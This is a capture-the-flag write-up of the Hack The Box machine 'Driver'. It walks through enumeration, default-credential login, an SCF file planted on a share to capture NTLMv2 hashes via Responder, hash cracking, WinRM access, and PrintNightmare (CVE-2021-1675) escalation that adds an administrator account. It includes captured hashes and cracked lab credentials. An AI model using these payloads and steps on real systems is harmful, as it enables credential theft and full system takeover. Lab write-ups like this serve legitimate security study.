#-------Enumeration-------#

```
┌──(mido㉿kali)-[~] └─$ nmap -sC -sV 10.10.11.106

Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-10 20:30 EST
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.76% done; ETC: 20:30 (0:00:00 remaining)
Nmap scan report for 10.10.11.106
Host is up (0.080s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h49m35s, deviation: 0s, median: 6h49m35s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-12-11T08:20:10
|_  start_date: 2021-12-11T06:57:49

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.05 seconds
```

#we find port 80 is opened we try to open browser http://10.10.11.106

It asks for creds , trying the default admin:admin & it works! Trying msfvenom payloads to get reverse shell and Pentestmonkey reverse shell our fav ! but nothing works

Then i notice this line in the index " Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon. "

i started to search for reverse shell for smb share reverse shell and thanks to https://www.puckiestyle.nl/smb-share-scf-file-attacks/
```
[Shell]
Command=2
IconFile=\\10.10.14.8\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
here is the code we use for reverse shell

Saving the test.txt file as SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the @test.scf on the top of the share drive.

so it will be test.scf

Then we use responder tool to capture the hashes of the users that will browse the share.
```
responder -h              
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -r -f
or:
responder -I eth0 -wrf

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -r, --wredir          Enable answers for netbios wredir suffix queries.
                        Answering to wredir will likely break stuff on the
                        network. Default: False
  -d, --NBTNSdomain     Enable answers for netbios domain suffix queries.
                        Answering to domain suffixes will likely break stuff
                        on the network. Default: False
  -f, --fingerprint     This option allows you to fingerprint a host that
                        issued an NBT-NS or LLMNR query.
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective when combined with
                        -r. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  -v, --verbose         Increase verbosity.
  
  ```
  ```
┌──(mido㉿kali)-[~] └─$ sudo responder -wrf --lm -v -I tun0

    2 ⚙

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
       NBT-NS, LLMNR & MDNS Responder 3.0.6.0



 Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [ON]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.8]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-WUTN47ZZFLT]
    Responder Domain Name      [8UYL.LOCAL]
    Responder DCE-RPC Port     [46942]

[+] Listening for events...                                                                                                                                                                                                                


[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:79effd63288ad335:13AF3BE8A0330EE6D7F1CCE21A7BB86C:010100000000000026A1B19F4CEED701C3D40F140875353400000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:5516d866b64ca220:C581F403958D002F6B0BAA60E1326CB1:0101000000000000FD14E69F4CEED7012F27684BBBFBDA7D00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:d66531e7a510e341:32B1D62C5104987A95EF19F0FD78C778:0101000000000000302918A04CEED701CA6CBFDB9B374B9500000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:04071f9cf022a85f:253C3E8BEFEB36F9FA27855A72ABEDB5:0101000000000000A1374AA04CEED70125BF7BC23D2CE74500000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:12a45028b427fda3:E3C878E17A7FB29AE168924A87714F61:0101000000000000B5E779A04CEED70176D1C5115AEE33C600000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:c7df094fabc0d16e:18576ADFC47526DC0CBAA2829C66F9B2:010100000000000082F9ABA04CEED7010C67C24EF24D7AEA00000000020000000000000000000000
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:7ea7545b4786c789:6C992007E05810D18BA8D075E00F1209:0101000000000000210CDEA04CEED7015D490E8C401F10F600000000020000000000000000000000
```

When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user

#----cracking hash------# Save the hash into txt file hashNTLM.txt

hashcat -m 5600 hashNTLM.txt /usr/share/wordlists/rockyou.txt --force we will use 5600 for NTLMv2

TONY::DRIVER:5516d866b64ca220:c581f403958d002f6b0baa60e1326cb1:0101000000000000fd14e69f4ceed7012f27684bbbfbda7d00000000020000000000000000000000:liltony
Great! "tony:liltony"

#Evil-WinRM__#

```evil-winrm -i 10.10.11.106 -u tony -p 'liltony' ``` First it didn't work then i reset the machine and later it worked well.

Now we are connected

```
Evil-WinRM* PS C:\Users\tony> cd Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop> dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/10/2021  10:58 PM             34 user.txt


*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
131a68852882898e573cc6f67ddced4b
#privilege escalation_# using WinPeas.exe

Enumerating IPv4 connections
 
Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
 
TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
TCP        0.0.0.0               135           0.0.0.0               0               Listening         712             svchost
TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
TCP        0.0.0.0               49408         0.0.0.0               0               Listening         448             wininit
TCP        0.0.0.0               49409         0.0.0.0               0               Listening         868             svchost
TCP        0.0.0.0               49410         0.0.0.0               0               Listening         1188            spoolsv
TCP        0.0.0.0               49411         0.0.0.0               0               Listening         816             svchost
TCP        0.0.0.0               49412         0.0.0.0               0               Listening         568             services
TCP        0.0.0.0               49413         0.0.0.0               0               Listening         576             lsass
TCP        10.10.11.106          139           0.0.0.0               0               Listening         4               System
TCP        10.10.11.106          5985          10.10.14.7            47132           Time Wait         0               Idle
TCP        10.10.11.106          5985          10.10.14.7            47134           Established       4               System
 
Enumerating IPv6 connections
 
Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name
 
TCP        [::]                                        80            [::]                                        0               Listening         4               System
TCP        [::]                                        135           [::]                                        0               Listening         712             svchost
TCP        [::]                                        445           [::]                                        0               Listening         4               System
TCP        [::]                                        5985          [::]                                        0               Listening         4               System
TCP        [::]                                        47001         [::]                                        0               Listening         4               System
TCP        [::]                                        49408         [::]                                        0               Listening         448             wininit
TCP        [::]                                        49409         [::]                                        0               Listening         868             svchost
TCP        [::]                                        49410         [::]                                        0               Listening         1188            spoolsv
TCP        [::]                                        49411         [::]                                        0               Listening         816             svchost
TCP        [::]                                        49412         [::]                                        0               Listening         568             services
TCP        [::]                                        49413         [::]                                        0               Listening         576             lsass
```

We find spoolsv which is Print Spooler service

So time to exploit , i start with cloning https://github.com/calebstewart/CVE-2021-1675

Then i move to to the remote host to apply out attack

```
python -m SimpleHTTPServer 8001 
Serving HTTP on 0.0.0.0 port 8001...
10.10.11.106 - - [10/Dec/2021 19:20:00] "GET /CVE-2021-1675.ps1 HTTP/1.1" 200 -
```

Then `Import-Module .\cve.ps1` i got error File `C:\Users\tony\Documents\cve.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.`

So first we need to be able to load the ps1 script https://stackoverflow.com/questions/41117421/ps1-cannot-be-loaded-because-running-scripts-is-disabled-on-this-system
```
*Evil-WinRM* PS C:\Users\tony\Documents> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
*Evil-WinRM* PS C:\Users\tony\Documents> Get-ExecutionPolicy 
Unrestricted


*Evil-WinRM* PS C:\Users\tony\Documents> Import-Module .\cve.ps1
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare -NewUser "Vendetta" -NewPassword "Vendetta00"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user 0xdf as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

our user is added so let's open new tab in our terminal

```
evil-winrm -i 10.10.11.106 -u Vendetta -p Vendetta00

*Evil-WinRM* PS C:\Users> cd Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/10/2021  10:58 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
d0beabd41e64a23047dc6a4aaa158aa1
```

##Done

00

